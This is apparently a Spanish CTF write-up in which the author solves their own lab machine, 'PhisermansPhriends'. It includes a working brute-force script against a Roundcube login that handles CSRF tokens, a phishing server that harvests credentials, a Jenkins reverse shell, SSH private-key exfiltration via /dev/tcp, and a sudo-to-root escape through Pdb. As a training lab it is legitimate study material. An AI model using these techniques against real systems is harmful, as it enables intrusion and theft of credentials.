---
layout: post
title: PhisermansPhriends
date: 2024.09.03
categories: [thl, ctf, linux, profesional]
---

![image](/assets/images/phisermans/0.jpg)

En esta ocasión voy a resolver una máquina **Linux** creada por mi de dificultad **Profesional** para la plataforma de [The Hackers Labs](https://thehackerslabs.com/).

# Enumeración

Empiezamos buscando la dirección IP del servidor en la red local:

```bash
$ sudo arp-scan -I eth1 --localnet
10.0.2.15      08:00:27:64:b7:09       (Unknown)
```

Como vemos la máquina tiene asignada la IP **10.0.2.15.**

Ahora vamos a realizar un escaneo de puertos con `nmap`. Hacemos un escaneo silencioso`-sS`, a todos los puertos `-p-`, que nos de detalles del escaneo `-v`, que no haga ping al host `-Pn`, que no haga resolución de DNS `-n` a nuestra máquina victima **10.0.2.15:**

```bash
$ sudo nmap -sS -p- -Pn -n -v 10.0.2.15
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
```

Vemos que tiene los puertos **22 y 80** abiertos y el **443** **cerrado**. Vamos a realizar otro escaneo con `nmap` pero esta vez para detectar la versión del servicio que este corriendo, `-sV`, y para ejecutar los scripts por defecto para detectar vulnerabilidades, `-sC`:

```bash
$ sudo nmap -sCV -p22,80 -v 10.0.2.15
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:e6:06:ab:20:8a:bc:9a:ce:c8:75:0f:aa:64:14:62 (ECDSA)
|_  256 65:1d:29:46:6e:f2:fe:0d:b8:0e:63:8c:0d:f5:a1:cc (ED25519)
80/tcp open  http    Apache httpd 2.4.61
|_http-server-header: Apache/2.4.61 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://phisermansphriends.thl/
```

Vemos que el servidor web nos redirige a un dominio, lo agregamos al fichero **/etc/hosts**:

```bash
$ echo '10.0.2.15 phisermansphriends.thl' | sudo tee -a /etc/hosts
10.0.2.15 phisermansphriends.thl
```

Vamos a ver que hay en esa web:

```bash
$ curl http://phisermansphriends.thl
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <body>
    <p>Estamos modificando la web. Contacto: mur.rusko@phisermansphriends.thl y admin@phisermansphriends.thl</>
  </body>
</html>
```

Vemos que hay 2 emails de contacto, los anotamos.

Ahora vamos a buscar subdominios:

```bash
$ ffuf -u http://10.0.2.15 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.phisermansphriends.thl' -c -fw 20
intranet                [Status: 403, Size: 589, Words: 309, Lines: 6, Duration: 9ms]
mail                    [Status: 200, Size: 5327, Words: 366, Lines: 97, Duration: 47ms]
```

Encontramos 2 subdominios, intranet (jenkins) y mail (roundcube), los añadimos al fichero **hosts**.

Como tenemos 2 emails vamos a buscar por las redes sociales a ver si encontramos algún usuario que pueda pertenecer a los usuarios encontrados. En instagram encontramos el perfil de [mur.rusko](https://www.instagram.com/mur.rusko/).  En el post que tiene publicado podemos leer lo siguiente:

```
🚀 ¡Hola a todos!

Me presento, soy **Mur Rusko** y hoy quiero compartir con ustedes una parte muy especial de mi vida. Nací el **20 de mayo de 1990**, y desde entonces he aprendido que la pasión por lo que haces es lo que realmente impulsa el éxito.

Es por eso que fundé **PhisermansPhriends**, una empresa que combina mi amor por la tecnología con mi compromiso de ofrecer soluciones innovadoras y de alta calidad. Nuestro objetivo es acompañar a nuestros clientes en cada paso de su camino hacia el éxito, brindando un servicio excepcional que va más allá de sus expectativas.

Además, me gustaría presentarles a un miembro muy importante de mi equipo, mi fiel compañero **Rufo** 🐾. Él nos recuerda cada día la importancia de la lealtad, la perseverancia y la energía positiva, valores que aplicamos en cada proyecto que emprendemos.

Estoy emocionado por lo que el futuro tiene reservado para **PhisermansPhriends** y estoy seguro de que juntos podemos lograr grandes cosas. 

Gracias a todos los que ya forman parte de este viaje y a los que se unirán pronto. ¡Vamos por más!

#emprendimiento #innovación #equipo #PhisermansPhriends #MurRusko #Rufo
```

# Intrusión

Vamos a gener un diccionario con los datos. Usaremos la herramienta **CUPP.**

Clonamos CUPP:

```bash
git clone https://github.com/Mebus/cupp.git
```

Lo ejecutamos y rellenamos los datos:

```bash
python cupp.py -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Mur
> Surname: Rusko
> Nickname: mur.rusko
> Birthdate (DDMMYYYY): 20051990

> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 

> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 

> Pet's name: Rufo
> Company name: PhisermansPhriends

> Do you want to add some key words about the victim? Y/[N]: 
> Do you want to add special chars at the end of words? Y/[N]: 
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to mur.txt, counting 3252 words.
> Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with mur.txt and shoot! Good luck!

```

Si nos fijamos en las peticiones al servicio de mail, vemos que tiene un token CSRF que va cambiando con cada petición. Necesitaremos un script que realice ese cambio de token para poder realizar el ataque de fuerza bruta.

Usamos el siguiente script:

```python
import argparse
import sys
import requests
import re
from multiprocessing.dummy import Pool as ThreadPool

settings = {
    "threads" : 10,
    "username" : "mur.rusko@phisermansphriends.thl",
    "url" : "http://mail.phisermansphriends.thl/"
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
}

if (len(sys.argv) > 1):
    console_mode = True
    parser = argparse.ArgumentParser(description='Command line mode')
    parser.add_argument('--threads', '-t', type=int,
                        help='Number of Threads', default=10)

    args = parser.parse_args()
    if (not args.threads):
        print("'--threads' was omitted")
        exit(-1)
    
    settings["threads"] = args.threads

def parse_token(text):
    pattern = 'request_token":"(.*)"}'
    token = re.findall(pattern, text)
    return token

def brute(login):
    try:
        url = settings['url']
        r = requests.get(url)
        cookies = r.cookies
        token = parse_token(r.text)
        r = requests.post(url + '?_task=login',
                          data={"_token": token, "_task": "login", "_action": "login", "_timezone": "Europe/Madrid",
                                "_url": "", "_user": settings['username'], "_pass": login}, headers=headers, cookies=cookies,
                          allow_redirects=False, timeout=30)

        if (r.status_code == 302):
            print("Succes with %s:%s" % (settings['username'], login))
            sys.exit()
        else:
            print(f"Code: {r.status_code} - passw: {login}")
    except Exception as ex:
        print(ex)

def verify():
    try:
        url = settings['url']
        r = requests.get(url, timeout=1)
        token = parse_token(r.text)
        if(token == ""):
            return False
        return True
    except Exception as ex:
        print(ex)
        return False

if __name__ == "__main__":
    passwords = open("mur.txt").read().split('\n')

    print("%d passwords loaded" % (len(passwords)))
    print("Trying with username %s" % (settings['username']))
    print("-----------------------------------------------------")

    if(not verify()):
        sys.exit()
    pool = ThreadPool(settings['threads'])
    results = pool.map(brute, passwords)
    pool.close()
    pool.join()

    print("-----------------------------------------------------")
    print("The End")
```

Lo ejecutamos usando 25 hilos:

```bash
$ python brute.py -t 25
...
Code: 401 - passw: Mur_5901990
Code: 401 - passw: 05199090
Code: 401 - passw: Mur99051990
Succes with mur.rusko@phisermansphriends.thl:MurRusko_90
Code: 401 - passw: Rusko1990
Code: 401 - passw: Rusko05
...
```

Encontramos la clave de acceso de **mur.rusko** para el servicio de mail. 

Ahora vamos intentar hacer phishing para obtener las credenciales de **intranet.phisermansphriends.thl**. 

Primero ponemos a la escucha un servidor en python que acepte **GET** y POST:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        try:
            file_path = '.' + self.path
            with open(file_path, 'rb') as file:
                self.send_response(200)
                if file_path.endswith('.html'):
                    self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(file.read())
        except FileNotFoundError:
            self.send_response(404)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"404 Not Found")
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Received POST request with body: " + body)
        print(body)

def run_server():
    server_address = ('', 80)
    httpd = HTTPServer(server_address, RequestHandler)
    print("Server running on port 80...")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
```

Nos guardamos la web de login para mandar al admin

```bash
$ curl http://intranet.phisermansphriends.thl/login -o index.html
```

Y nos ponemos a la escucha:

```bash
$ python server.py
Server running on port 80...
```

Ahora vamos a mandarle un email a admin desde el servicio de mail:

![image](/assets/images/phisermans/1.png)

Ahora esperamos a que nos responda el admin:

```bash
$ python server.py
Server running on port 80...
10.0.2.15 - - [30/Aug/2024 22:29:54] "GET / HTTP/1.1" 200 -
10.0.2.15 - - [30/Aug/2024 22:30:09] "POST / HTTP/1.1" 200 -
b'j_username=admin&j_password=RqykJVKDt2RBjnR2q1zeIMYm&from=%2F&Submit='
```

Nos logeamos en intranet con las credenciales que acabamos de conseguir. 

![image](/assets/images/phisermans/2.png)

Como sabemos, podemos obtener una reverse shell ejecutando un script escrito en Groovy desde Jenkins. En esta máquina solo podemos obtener la shell usando el puerto **443**, ya que el resto de puertos están cerrados.

![image](/assets/images/phisermans/3.png)

Obtenemos la shell:

```bash
$ sudo nc -nlvp 443
[sudo] password for murrusko: 
listening on [any] 443 ...
connect to [10.0.2.5] from (UNKNOWN) [10.0.2.15] 49810

script /dev/null -qc bash
jenkins@phisermansphriends:~$ ^Z
```

Hacemos el tratamiento de la TTY y estamos dentro del sistema.

Miramos que usuarios hay en el sistema y vemos que hay 2 usuarios más además de el usario root.

```bash
jenkins@phisermansphriends:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
mur:x:1000:1000:Mur Rusko,,,:/home/mur:/bin/bash
jenkins:x:106:115:Jenkins,,,:/var/lib/jenkins:/bin/bash
sysadmin:x:1001:1001:sysadmin,,,:/home/sysadmin:/bin/bash
```

Vamos a probar a reusar la pass de **mur.rusko**:

```bash
jenkins@phisermansphriends:~$ su mur
Contraseña: 
mur@phisermansphriends:/var/lib/jenkins$
```

Vemos que ha funcionado, listamos el home del usuario y vemos un fichero **.password**:

```bash
mur@phisermansphriends:/var/lib/jenkins$ cd ~
mur@phisermansphriends:~$ ls -la
total 32
drwx------ 3 mur  mur  4096 ago 30 04:54 .
drwxr-xr-x 5 root root 4096 ago 30 03:50 ..
lrwxrwxrwx 1 mur  mur     9 ago 30 03:40 .bash_history -> /dev/null
-rw-r--r-- 1 mur  mur   220 ago 29 14:23 .bash_logout
-rw-r--r-- 1 mur  mur  3526 ago 29 14:23 .bashrc
drwxr-xr-x 3 mur  mur  4096 ago 30 03:55 .local
-r-------- 1 mur  mur    34 ago 30 04:54 .password
-rw-r--r-- 1 mur  mur   807 ago 29 14:23 .profile
-r-------- 1 mur  mur    33 ago 30 03:55 user.txt
```

Lo abrimos y vemos lo que parece una contraseña de un script:

```bash
mur@phisermansphriends:~$ cat .password 
if password != 'SuperSecretPass':
```

# Escalada de privilegios

Enumeramos si puede ejecutar algún comando como root:

```bash
mur@phisermansphriends:~$ sudo -l
Matching Defaults entries for mur on phisermansphriends:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User mur may run the following commands on phisermansphriends:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/util.py
```

Vemos que no podemos leer el script:

```bash
mur@phisermansphriends:~$ ls -l /opt/
total 4
-r-------- 1 root root 1751 ago 30 04:41 util.py
```

Probamos a ejecutarlo:

```bash
mur@phisermansphriends:~$ sudo /usr/bin/python3 /opt/util.py
Escuchando en localhost:443
Escuchando en localhost:443
```

Lo único que vemos es que esta a la escucha en localhost en el puerto 443. 

Intentamos conectarnos por SSH pero vemos que no podemos conectarnos usando la password;

```bash
ssh mur@10.0.2.15 
mur@10.0.2.15: Permission denied (publickey).
```

Generamos las claves publica/privada y la añadimos al fichero **authorized_keys**:

```bash
mur@phisermansphriends:~$ ssh-keygen -t rsa -b 4096

mur@phisermansphriends:~$ cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
mur@phisermansphriends:~$ chmod 600 ~/.ssh/authorized_keys
```

Nos mandamos a nuestra máquina la clave privada, pero por el puerto 443:

```bash
# mandamos por el puerto 443
mur@phisermansphriends:~$ cat .ssh/id_rsa > /dev/tcp/10.0.2.5/443

$ sudo nc -nlvp 443 > id_mur
[sudo] password for murrusko: 
listening on [any] 443 ...
connect to [10.0.2.5] from (UNKNOWN) [10.0.2.15] 43688
```

Le cambiamos los permisos:

```bash
$ chmod 400 id_mur
```

Y nos conectamos 

```bash
ssh -i id_mur mur@10.0.2.15
Linux phisermansphriends.thl 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64
.-. . . .-. .-. .-. .-. .  . .-. . . .-. 
|-' |-|  |  `-. |-  |(  |\/| |-| |\| `-. 
'   ' ` `-' `-' `-' ' ' '  ` ` ' ' ` `-'
.-. . . .-. .-. .-. . . .-. .-. 
|-' |-| |(   |  |-  |\| |  )`-. 
'   ' ` ' ' `-' `-' ' ` `-' `-' 
Last login: Thu Aug 29 15:11:20 2024
mur@phisermansphriends:~$
```

Ahora ya podemos conectarnos al socket:

```bash
mur@phisermansphriends:~$ telnet localhost 443
Trying ::1...
Connection failed: Conexión rehusada
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: SuperSecretPass
Hola admin!

Que hacemos: 
[1] Ver procesos
[2] Ver espacio libre
[3] Ver sockets
[4] Salir
h
```

Metemos la clave que habíamos encontrado y en provocamos un fallo introduciendo un carácter en vez de un dígito.  Como vemos en la otra terminal, donde ejecutamos el socket, que nos muestra un error. La librería Pdb tiene un modo interactivo que nos permite ejecutar código en python. Entramos con interactive y abrimos una shell:

```bash
mur@phisermansphriends:~$ sudo /usr/bin/python3 /opt/util.py
Escuchando en localhost:443
invalid literal for int() with base 10: b'h'
> /opt/util.py(29)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) interact
*interactive*
>>> import pty
>>> pty.spawn('/bin/bash')
root@phisermansphriends:/home/mur#
```

Espero que os haya gustado.